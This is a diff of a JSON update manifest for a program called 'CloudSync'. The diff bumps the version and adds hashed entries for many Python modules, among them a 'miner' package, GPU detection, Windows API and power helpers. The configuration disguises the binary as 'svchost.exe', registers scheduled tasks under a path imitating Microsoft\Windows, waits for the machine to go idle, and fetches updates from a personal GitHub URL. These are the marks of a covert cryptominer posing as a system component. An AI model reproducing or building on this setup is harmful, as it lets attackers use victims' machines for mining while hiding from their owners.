@@ -1,29 +1,137 @@
 {
-    "name":  "CloudSync",
-    "version":  10,
-    "binary":  "svchost.exe",
-    "idle_seconds":  180,
-    "force_gpu":  false,
-    "remote_update":  true,
-    "legacy_update":  false,
-    "worker_tag":  "w",
-    "update_base":  "https://raw.githubusercontent.com/minjiwilliams-dotcom/config/main/",
-    "tasks":  [
-                  "Microsoft\\Windows\\CloudSync\\CloudSync",
-                  "Microsoft\\Windows\\CloudSync\\CloudSyncHealth"
-              ],
-    "files":  [
-                  {
-                      "path":  "controller.py",
-                      "sha256":  "89c24055751b563ae4e470ace3963b9a58cf6f81046c7bbf829336aba7533f00"
-                  },
-                  {
-                      "path":  "gpudetect.py",
-                      "sha256":  "3f321124d0dbb8b311a30c7e1bbae56616c88c2da20dfc23487fd8ec7174a6b4"
-                  },
-                  {
-                      "path":  "config_high.json",
-                      "sha256":  "e31a2c5b7ce643e9907e8aa73206b08d32fa67757f60950adf12ce1ee58b0dd7"
-                  }
-              ]
+  "name": "CloudSync",
+  "version": 11,
+  "binary": "svchost.exe",
+  "idle_seconds": 180,
+  "force_gpu": false,
+  "remote_update": true,
+  "legacy_update": false,
+  "worker_tag": "w",
+  "update_base": "https://raw.githubusercontent.com/minjiwilliams-dotcom/config/main/",
+  "tasks": [
+    "Microsoft\\Windows\\CloudSync\\CloudSync",
+    "Microsoft\\Windows\\CloudSync\\CloudSyncHealth"
+  ],
+  "files": [
+    {
+      "path": "controller.py",
+      "sha256": "89c24055751b563ae4e470ace3963b9a58cf6f81046c7bbf829336aba7533f00"
+    },
+    {
+      "path": "gpudetect.py",
+      "sha256": "3f321124d0dbb8b311a30c7e1bbae56616c88c2da20dfc23487fd8ec7174a6b4"
+    },
+    {
+      "path": "config_high.json",
+      "sha256": "e31a2c5b7ce643e9907e8aa73206b08d32fa67757f60950adf12ce1ee58b0dd7"
+    },
+    {
+      "path": "cloudsync/__init__.py",
+      "sha256": "2594246733b3e0313656112cb34185f2cda75598dc796a47ce9677a76b741f8f"
+    },
+    {
+      "path": "cloudsync/__main__.py",
+      "sha256": "af310e1705606e1be2d1c40daaf6b0095d325ca52bad71bbee6ed4bd86644ce0"
+    },
+    {
+      "path": "cloudsync/config/__init__.py",
+      "sha256": "29a2b603d576e1e456c75c6ec03d8b92de660313f9d2845d265ecccf165b889f"
+    },
+    {
+      "path": "cloudsync/config/overrides.py",
+      "sha256": "f842c18d74e00744c32122d9bccc11658ed356cbbc6955c92ebf767aa99ef2d0"
+    },
+    {
+      "path": "cloudsync/config/profiles.py",
+      "sha256": "4c734b497a372c1802702b59c16d8b777d3ce193da9d23b780f3357251e7cc74"
+    },
+    {
+      "path": "cloudsync/config/settings.py",
+      "sha256": "ebbe9623040ec2ac030fae3c2c88db7c84aaf639c77c44e6d296adaba3728a46"
+    },
+    {
+      "path": "cloudsync/core/__init__.py",
+      "sha256": "de90caaa3d8155bc038ffbef37ff7c30e2be2d23f830b824ec0b972d2785495a"
+    },
+    {
+      "path": "cloudsync/core/clock.py",
+      "sha256": "0ec436ad596f3d06dc7159229e7d1781dabb889d03852d5c35f2de2704aa471b"
+    },
+    {
+      "path": "cloudsync/core/diagnostics.py",
+      "sha256": "37f2596d5ba0692a5095df22d097bfc72137ce740b8931f9129c1e4f3958bf9a"
+    },
+    {
+      "path": "cloudsync/core/errors.py",
+      "sha256": "3c302fae65717d76559004817ac495f874babded1d29e7e91555d30b519c24b3"
+    },
+    {
+      "path": "cloudsync/core/logging.py",
+      "sha256": "d651424d7bf51c02f545d4004f05ac3a1f9595716a6d7a8c4b4f9766d160dd82"
+    },
+    {
+      "path": "cloudsync/core/state.py",
+      "sha256": "3f68508f20b5016585ae8b855c2b57993542e4c5559e283101ee9bc15b4c90bf"
+    },
+    {
+      "path": "cloudsync/health.py",
+      "sha256": "ce829ab660425fc03c89cb4952f5b75b16ff2679d612afa143d375a9e2316ee9"
+    },
+    {
+      "path": "cloudsync/lifecycle.py",
+      "sha256": "1b29e7e1ff077a4fcf926e98dc9ee6beb0ed3e2f1566862d95e8928d977bb250"
+    },
+    {
+      "path": "cloudsync/miner/__init__.py",
+      "sha256": "e68ef207c7e65cd7d1efe6eef4bcf5b91fa176bf01c66da06ccfcafccce92dbd"
+    },
+    {
+      "path": "cloudsync/miner/config.py",
+      "sha256": "0a0d6e5bf98a4a4b499c1c6919afbdfa4ba61a88d3d0169082df5f7fb9159de7"
+    },
+    {
+      "path": "cloudsync/miner/telemetry.py",
+      "sha256": "95ebf68f7d0443ca446d8efbabe95520f9dec607342b699f93926ea7b874b282"
+    },
+    {
+      "path": "cloudsync/miner/worker.py",
+      "sha256": "ba4c72da4e431d6f3dba43c8628bb01fe5abb753451c2d91f4c161fbae8dc1d6"
+    },
+    {
+      "path": "cloudsync/platform/__init__.py",
+      "sha256": "16da40bf91bc2055245bfa07e0454db7c37c77c758065abf86ae8834f1d5f778"
+    },
+    {
+      "path": "cloudsync/platform/gpu.py",
+      "sha256": "99554b226bcdb9f8c14ec2e86fed0dd19f085da8e29a97d9f4863e5d2cbfe889"
+    },
+    {
+      "path": "cloudsync/platform/jobs.py",
+      "sha256": "445e5e317ebcface20b12f9d80241d71967dddc64e5edce9f8f02b26ee18869e"
+    },
+    {
+      "path": "cloudsync/platform/mutex.py",
+      "sha256": "b80a1431e4959acf6ff53443559c7c947fd1053c6020057f08a9b6e086183a6a"
+    },
+    {
+      "path": "cloudsync/platform/power.py",
+      "sha256": "c9a2b9b52d040f0aedb7b4800278895f7dd865ad706be16e8f3fbc08d005bcd9"
+    },
+    {
+      "path": "cloudsync/platform/tasks.py",
+      "sha256": "44a3f49b0340d5fe3978fb4197168d7059f33899d2d60c95e2bec5fbf3ee9156"
+    },
+    {
+      "path": "cloudsync/platform/winapi.py",
+      "sha256": "8329ee256070e29d8bc95d61dc171ca39f7c5cf5f25d54e496ba6c33001bc758"
+    },
+    {
+      "path": "cloudsync/supervisor.py",
+      "sha256": "55f745818dbd74284af6315165b99bec146143712e95dc5fd4b314f37b0546cf"
+    },
+    {
+      "path": "cloudsync/updater.py",
+      "sha256": "6f65329c6a27e693631a8eea1995bac3fddcc2268fe8fcbf99a669a68faee11b"
+    }
+  ]
 }
